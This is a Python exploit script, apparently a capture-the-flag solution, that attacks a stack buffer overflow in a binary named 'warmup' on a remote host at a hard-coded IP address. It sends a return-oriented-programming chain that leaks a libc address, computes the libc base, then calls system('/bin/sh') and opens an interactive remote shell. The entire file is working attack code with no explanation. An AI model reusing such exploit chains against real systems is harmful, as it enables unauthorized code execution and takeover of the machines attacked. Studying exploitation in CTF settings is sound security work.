from ptrlib import *

libc = ELF("./libc-2.27.so")
elf = ELF("./share/warmup")
#sock = Process("./share/warmup")
#sock = Socket("localhost", 9999)
sock = Socket("nc 141.164.48.191 10001")

rop_mov_edi_1_call_write_mov_rsi_rbx_mov_edx_C0h_xor_edi_edi_xor_eax_eax_call_read_add_rsp_30h_pop_rbx = 0x40055d
rop_call_prbxP31h = 0x0040053c
addr_stdout = 0x601000
addr_main = 0x40053d

payload  = b"A" * 0x30
payload += p64(addr_stdout) # rbp
payload += p64(rop_mov_edi_1_call_write_mov_rsi_rbx_mov_edx_C0h_xor_edi_edi_xor_eax_eax_call_read_add_rsp_30h_pop_rbx)

payload += b"\x00" * 0x30 # envp
payload += p64(addr_stdout) # rbp
payload += p64(rop_mov_edi_1_call_write_mov_rsi_rbx_mov_edx_C0h_xor_edi_edi_xor_eax_eax_call_read_add_rsp_30h_pop_rbx)

payload += b"C" * 0x38
payload += p64(addr_main)

payload += b'X' * (0xc0 - len(payload))
sock.sendafter("> ", payload)
sock.recvonce(0xc0)

sock.send("A"*0x10)
libc_base = u64(sock.recvonce(0xc0)[0x10:0x18]) - libc.symbol("_IO_2_1_stdin_")
libc.set_base(libc_base)

sock.send("A"*0xc0)

rop_pop_rdi = libc_base + 0x000215bf
payload  = b"A" * 0x38
payload += p64(rop_pop_rdi+1)
payload += p64(rop_pop_rdi)
payload += p64(next(libc.find("/bin/sh")))
payload += p64(libc.symbol("system"))
sock.sendafter("> ", payload)

sock.interactive()

